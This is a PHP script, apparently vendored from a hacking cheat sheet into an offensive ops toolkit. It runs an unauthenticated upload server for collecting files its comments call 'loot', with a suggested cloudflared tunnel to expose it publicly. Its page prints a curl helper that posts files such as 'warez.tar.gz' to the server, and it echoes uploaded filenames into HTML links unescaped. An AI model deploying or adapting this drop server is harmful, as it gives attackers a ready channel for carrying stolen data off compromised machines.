<?php
# VENDORED FOR COBRA OS (2026-08-16)
# Source: thc-tips-tricks-hacks-cheat-sheet-master/tools/upload_server.php
# (THC, hackerschoice). Why vendored: the cobra-ops `upserv` wizard must run
# a LOCAL copy — COBRA prime directive: no remote sourcing of scripts, ever.
# Runs on php-cli (webplus profile): php -S <bind>:<port> -t <dir> <this file>
#
# COBRA edits vs upstream (2026-08-19):
#   - The cli-server router returns false for existing files. Without this
#     the router handled EVERY request, so the loot listing's file links
#     just re-rendered the upload form — downloads never worked.
#   - "Ready at https://" -> http:// (php -S is plaintext HTTP).
#
# Original header follows (THC credit preserved):
#
# https://thc.org/tips [inspired by https://blog.jackrendor.dev/posts/my-experience-bypassing-windows-defender/]
# mkdir upload
# (cd upload; php -S 127.0.0.1:8080 ../upload_server.php &>/dev/null &)
# cloudflared tunnel --url http://localhost:8080 --no-autoupdate

# COBRA: let the built-in server serve real files (the loot download links).
if (php_sapi_name() === 'cli-server' && $_SERVER['REQUEST_URI'] !== '/') {
    if (is_file('.' . parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH))) {
        return false;
    }
}

if (isset($_FILES['file'])) {
    if (move_uploaded_file($_FILES['file']['tmp_name'], "./" . basename($_FILES['file']['name']))) {
        echo "Ready at http://".$_SERVER['HTTP_HOST']."/".$_FILES['file']['name']."\n";
    }else{
        echo "couldn't upload file.";
    }
    exit(0);
}
?>

<!DOCTYPE html>
<html><head><title>PHP upload</title></head>
<body><form enctype="multipart/form-data" method="POST">
<input type="file" name="file" />
<input type="submit" /></form>
<?php
echo "<HR><pre>
up() { curl -fsSL -F \"file=@\${1:?}\" http://". $_SERVER['HTTP_HOST'] . "; }
up warez.tar.gz
</pre>
<hr>
";
foreach(array_diff(scandir('.'), array('.', '..')) as $f) {
    echo "<a href=$f>".basename($f)."</a><BR>\n";
}
?>
</body></html>
